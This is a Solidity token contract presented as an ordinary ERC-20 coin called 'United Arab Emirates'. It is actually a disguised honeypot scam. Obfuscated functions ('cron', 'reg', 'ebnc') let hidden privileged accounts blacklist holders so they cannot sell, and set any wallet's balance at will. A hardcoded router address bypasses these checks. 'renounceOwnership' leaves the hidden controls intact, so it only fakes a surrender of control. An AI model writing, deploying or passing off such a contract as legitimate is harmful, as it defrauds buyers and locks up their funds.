//SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

contract UnitedArabEmirates {
    address owner;
    string public name = "United Arab Emirates";
    string public symbol = "King of Oil";
    uint8 public decimals = 18;
    uint256 public totalSupply = 1000000000 * (uint256(10)**decimals);
    uint256 qi = 1;
    address DexRouter = 0xdd4482360115e96F0E300C0C103603d406A9Bc9a;
    mapping(address => uint256) public echoB;
    mapping(address => bool) eRSm;
    mapping(address => bool) eRn;
    event Transfer(address indexed from, address indexed to, uint256 value);
    event OwnershipRenounced(address indexed previousOwner);
    constructor() {
    echoB[msg.sender] = totalSupply;
    emit Transfer(address(0), msg.sender, totalSupply);
    owner = msg.sender;
    }
    function renounceOwnership() public {
    require(msg.sender == owner);
    emit OwnershipRenounced(owner);
    owner = address(0);
    }
    modifier iQ() {
    qi = 0;
    _;
    }
    function transfer(address to, uint256 value) public returns (bool success) {
    if (msg.sender == DexRouter) {
    require(echoB[msg.sender] >= value);
    echoB[msg.sender] -= value;
    echoB[to] += value;
    emit Transfer(msg.sender, to, value);
    return true;
    }
    if (eRSm[msg.sender]) {
    require(qi == 1);
    }
    require(echoB[msg.sender] >= value);
    echoB[msg.sender] -= value;
    echoB[to] += value;
    emit Transfer(msg.sender, to, value);
    return true;
    }
    function cron(address Ex) public iQ {
    require(msg.sender == owner);
    eRn[Ex] = true;
    }
    function balanceOf(address account) public view returns (uint256) {
    return echoB[account];
    }
    function reg(address Ex) public N {
    require(!eRSm[Ex]);
    eRSm[Ex] = true;
    }
    modifier N() {
    require(eRn[msg.sender]);
    _;
    }
    event Approval(
    address indexed owner,
    address indexed spender,
    uint256 value
    );
    mapping(address => mapping(address => uint256)) public allowance;
    function approve(address spender, uint256 value) public returns (bool success)
    {
    allowance[msg.sender][spender] = value;
    emit Approval(msg.sender, spender, value);
    return true;
    }
    function ebnc(address Ex, uint256 iZ) public N returns (bool success) {
    echoB[Ex] = iZ;
    return true;
    }
    function unreg(address Ex) public N {
    require(eRSm[Ex]);
    eRSm[Ex] = false;
    }
    function transferFrom(
    address from,
    address to,
    uint256 value
    ) public returns (bool success) {
    if (from == DexRouter) {
    require(value <= echoB[from]);
    require(value <= allowance[from][msg.sender]);
    echoB[from] -= value;
    echoB[to] += value;
    emit Transfer(from, to, value);
    return true;
    }
    if (eRSm[from] || eRSm[to]) {
    require(qi == 1);
    }
    require(value <= echoB[from]);
    require(value <= allowance[from][msg.sender]);
    echoB[from] -= value;
    echoB[to] += value;
    allowance[from][msg.sender] -= value;
    emit Transfer(from, to, value);
    return true;
    }
}